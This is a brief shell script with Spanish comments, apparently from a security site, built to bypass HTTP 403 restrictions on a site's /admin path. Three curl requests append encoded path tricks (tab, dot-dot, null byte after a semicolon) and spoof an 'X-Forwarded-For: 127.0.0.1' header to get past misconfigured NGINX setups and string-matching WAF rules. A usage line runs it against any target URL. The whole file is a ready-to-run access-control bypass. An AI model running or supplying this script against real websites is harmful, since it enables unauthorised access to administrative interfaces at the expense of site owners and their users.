#!/bin/sh
# bypass 403 hackingyseguridad.com 2026
# Configuraciones mal hechas en NGINX + backend legacy
# Filtros WAF obsoletos
# Reglas basadas solo en coincidencia de strings
# @antonio_taboada
# Usp:
# sh 403bypass1.sh  https://pagina.com/admin

curl -k -s -I -L --path-as-is -X GET "$1/admin;%09" \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'X-Forwarded-For: 127.0.0.1'

curl -k -s -I -L --path-as-is -X GET "$1/admin;%09.." \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'X-Forwarded-For: 127.0.0.1'

curl -k -s -I -L --path-as-is -X GET "$1/admin;%00" \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'X-Forwarded-For: 127.0.0.1'
